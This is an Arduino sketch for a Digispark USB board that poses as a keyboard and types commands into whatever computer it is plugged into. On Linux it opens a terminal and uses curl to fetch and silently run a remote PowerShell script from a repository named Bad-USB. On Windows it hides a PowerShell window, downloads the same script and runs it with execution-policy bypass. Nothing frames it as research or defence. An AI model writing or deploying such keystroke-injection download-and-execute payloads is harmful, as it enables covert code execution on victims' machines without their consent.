#include "DigiKeyboard.h"

void setup() {
  // 1. Initial delay to allow the OS to register the USB HID device
  DigiKeyboard.delay(2000);
  pinMode(1, OUTPUT); // LED pin for Digispark
  digitalWrite(1, HIGH);

// 1. Minimize Windows
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
  
  DigiKeyboard.delay(500);

  DigiKeyboard.print("gnome-terminal");
  DigiKeyboard.delay(150); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); 


  DigiKeyboard.print("curl -sL https://raw.githubusercontent.com/black1hp/Bad-USB/main/program.ps1 -o /tmp/p.ps1 && pwsh /tmp/p.ps1 >/dev/null 2>&1 & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(1500); 

  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(150);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("powershell -window hidden -command iwr \"https://raw.githubusercontent.com/black1hp/Bad-USB/main/program.ps1\" -UseBasicParsing -OutFile \"$env:TEMP\\p.ps1\"; powershell -ep bypass -window hidden -file \"$env:TEMP\\p.ps1\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Turn off LED to signal completion
  digitalWrite(1, LOW);
}

void loop() {
  // Do nothing
}